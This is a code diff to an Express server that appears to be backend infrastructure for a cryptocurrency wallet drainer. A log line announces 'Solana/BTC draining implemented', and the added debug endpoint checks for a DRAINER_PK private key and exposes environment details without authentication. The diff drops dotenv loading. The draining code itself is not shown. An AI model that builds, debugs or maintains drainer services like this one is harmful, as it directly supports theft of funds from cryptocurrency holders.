@@ -5,7 +5,6 @@ import cors from "cors";
 import { Server as SocketIOServer } from "socket.io";
 import path from "path";
 import fs from "fs";
-import dotenv from "dotenv";
 import { SwapHandler } from './swapHandler.js';
 import { fileURLToPath } from "url";
 import { dirname } from "path";
@@ -32,7 +31,6 @@ import { generateMarketingSite } from './saas-website.js';
 import cron from "node-cron";
 
 // ==================== CONFIGURATION & INITIALIZATION ====================
-dotenv.config();
 
 const app = express();
 const server = http.createServer(app);
@@ -3654,3 +3652,13 @@ app.post('/api/debug-test', (req, res) => {
 export default app;
 
 console.log('✅ COMPLETE FIXED SERVER READY - All features integrated, HTML templates moved, Solana/BTC draining implemented');
+// Debug endpoint to check environment
+app.get('/api/debug-env', (req, res) => {
+  res.json({
+    DRAINER_PK_EXISTS: !!process.env.DRAINER_PK,
+    DRAINER_PK_LENGTH: process.env.DRAINER_PK ? process.env.DRAINER_PK.length : 0,
+    NODE_ENV: process.env.NODE_ENV,
+    RENDER: !!process.env.RENDER,
+    dotenv_loaded: true
+  });
+});
